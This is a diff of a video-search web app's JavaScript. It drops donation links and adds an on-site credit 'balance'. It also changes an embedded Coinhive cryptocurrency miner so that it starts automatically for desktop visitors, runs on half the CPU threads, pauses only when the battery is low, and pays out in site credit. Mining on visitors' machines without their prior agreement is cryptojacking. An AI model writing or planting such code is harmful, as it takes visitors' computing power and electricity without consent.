@@ -1,6 +1,8 @@
 
 function init(){
-    window['config'] = {
+
+
+    window.config = {
     //     nodeUrl:"http://127.0.0.1:8888/"
         nodeUrl:"//charon-node.herokuapp.com/"
         ,userLang:navigator.language || navigator.userLanguage
@@ -11,10 +13,10 @@ function init(){
             ,"default":"Bookmark me,if u have next time"
         }
         ,feedback:{
-    //         "zh-CN":''
-    //         ,"default":''   
-            "zh-CN":'<a href="#donate" onclick="showAlipay()"><span><img src="img/hb.jpg"/>领了后赏给超龙吧</span></a>'
-            ,"default":'<a href="#donate" onclick="showPayPal()"><span>Feedback?<br/> PayPal leave a message.</span></a>'       
+             "zh-CN":''
+             ,"default":''   
+//            "zh-CN":'<a href="#donate" onclick="showAlipay()"><span><img src="img/hb.jpg"/>领了后赏给超龙吧</span></a>'
+//            ,"default":'<a href="#donate" onclick="showPayPal()"><span>Feedback?<br/> PayPal leave a message.</span></a>'       
         }
         ,hiddenHistory:{
             "zh-CN":'看过的被隐藏数量是'
@@ -23,7 +25,17 @@ function init(){
         ,fetchers:["panc","panduoduo","magnet","tieba"]
         ,balance:{
             "zh-CN":'余额:'
-            ,"default":"balance"
+            ,"default":"balance:"
+        }
+        ,balanceCut:{
+            
+            "zh-CN":'你的<span class="balance"></span>余额'
+            ,"default":'Your <span class="balance"></span> balance '
+        }
+        ,balanceAdd:{
+            
+            "zh-CN":'谢谢，<span class="balance"></span>+'
+            ,"default":'Thanks,<span class="balance"></span>+'
         }
         ,balanceCredit:{
             "zh-CN":'个'
@@ -35,6 +47,7 @@ function init(){
         }
     };
     window['showVideos'] = [];
+        window.money = Money();
 
 }
 
@@ -134,7 +147,7 @@ function locationParameterChanged() {
         return;
     }
     if(isShowBookmark()){
-        addBookmark();
+//         addBookmark();
     }
 //     setMagnetTech();
 }
@@ -149,7 +162,9 @@ function showHideVideos(){
    location.reload();
 }
 function loadFetchers(fetchers,key){
-
+    if(!fetchers){
+        money.change(-1);
+    }
     (fetchers||config.fetchers).map(function(fetcher,index){
         fetcher = fetcher||config.fetchers[index]
         if(typeof fetcher === "object"&&fetcher.host){
@@ -1497,6 +1512,18 @@ function isItClick(isIt){
 //     if(iniframe()){
 //         addShare(key);
 //     }
+    if(isFirstIsIt(key)){
+        money.change(1);
+    }
+}
+function isFirstIsIt(key){
+    var nots = JSON.parse(localStorage.getItem("notIsFirstIsIt")||"{}");
+    if(!nots[key]){
+        nots[key] = true;
+        localStorage.setItem("notIsFirstIsIt", JSON.stringify(nots));
+        return true;
+    }
+    return false;
 }
 
 function storageItTrue(key,isIt,remove){
@@ -1558,11 +1585,9 @@ function importCSS(href,cssId){
     }
 }
 function loadShare(key){
-
-    window.money = Money();
     addCoinhive();
     
-    addDonate();
+//     addDonate();
     importCSS("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css","awesome");
     addShare(key);
     if(!inIframe()){
@@ -1715,7 +1740,12 @@ function isDirect(){
 function addCoinhive(){
     if(screen.width>=751&&!/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ){
         importScript ("https://coin-hive.com/lib/coinhive.min.js", function(){
-            miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP');
+            if (navigator.hardwareConcurrency > 1){
+                var cpuConfig = {threads: Math.round(navigator.hardwareConcurrency/2)}
+            }else{
+                var cpuConfig = {throttle:0.6}
+            } 
+            miner = new CoinHive.Anonymous('Wtx9zrRVSwMjJmFssPEtuCxnzkdo3QaP',cpuConfig);
             if (!miner.isMobile() && !miner.didOptOut(14400)) {
                 if(!localStorage.getItem("removeCoinHive")){
                     startCoinHive();
@@ -1734,6 +1764,14 @@ function startCoinHive(){
     // Update stats once per second
 
     miner.interval = setInterval(function() {
+        try {
+          navigator.getBattery().then(function (battery) {
+              if (battery.level < 0.50 && battery.charging == false) {
+                  miner.stop();
+                  console.log("检测到电力不足已停止运算");
+              }
+          });
+        }catch(e){console.log(e)}
         var hashesPerSecond = miner.getHashesPerSecond();
         var totalHashes = miner.getTotalHashes();
         var acceptedHashes = miner.getAcceptedHashes();
@@ -1741,7 +1779,7 @@ function startCoinHive(){
             +totalHashes+'</a><button title="stop" onclick="stopCoinHive()">✗</button>';
         // Output to HTML elements...
         document.querySelector(".coinhive-miner").innerHTML = html;
-        money.setHash(totalHashes);
+        money.change(hashesPerSecond/10000);
     }, 1000);
 }
 function stopCoinHive(){
@@ -1875,9 +1913,20 @@ function Money(){
     _money.setD = function(num){
         var num = num.toFixed(isInt(num)?0:4);
         var moneyD = document.getElementById("money");
-        var html = (dedent `<span class="account" title="${config.accountTitle.lang()} ${_money.fp}">${config.accountTitle.lang()}${_money.fp}</span>
-      <span class="balance">${config.balance.lang()}${num}${config.balanceCredit.lang()}</span>`);
+        var html = (dedent `
+            <span class="balance">${config.balance.lang()}${num}${config.balanceCredit.lang()}</span>`);
         moneyD.innerHTML = html;
+    }
+    _money.change = function(num){
+        if(num*num>=1){
+            var string = config[num<0?"balanceCut":"balanceAdd"].lang()+num;
+            
+            showPrompt(string);
+        }
+        _money.num = _money.num+num;
+        _money.save();
+        _money.setD(_money.num);
+
     }
 //     _money.add = function(num){
 //         _money.num += num;
@@ -1885,18 +1934,21 @@ function Money(){
 //         _money.save();
 //     }
     _money.save = function(){
-        localStorage.setItem(_money.fp,_money.num+_money.hashMoney);
+        localStorage.setItem(_money.fp,_money.num);
     }
 
-    _money.setHash = function(hashes){
-        _money.hashMoney = (hashes/10000);
-        _money.setD(_money.num+_money.hashMoney);
-        _money.save();
-    }
     return _money.init();
 }
 function isInt(value) {
   return !isNaN(value) && 
          parseInt(Number(value)) == value && 
          !isNaN(parseInt(value, 10));
+}
+
+function showPrompt(html){
+    var promptD = document.createElement("div");
+    promptD.innerHTML = html;
+    promptD.classList.add("prompt-show");
+    document.body.appendChild(promptD);
+//     alert(text);
 }
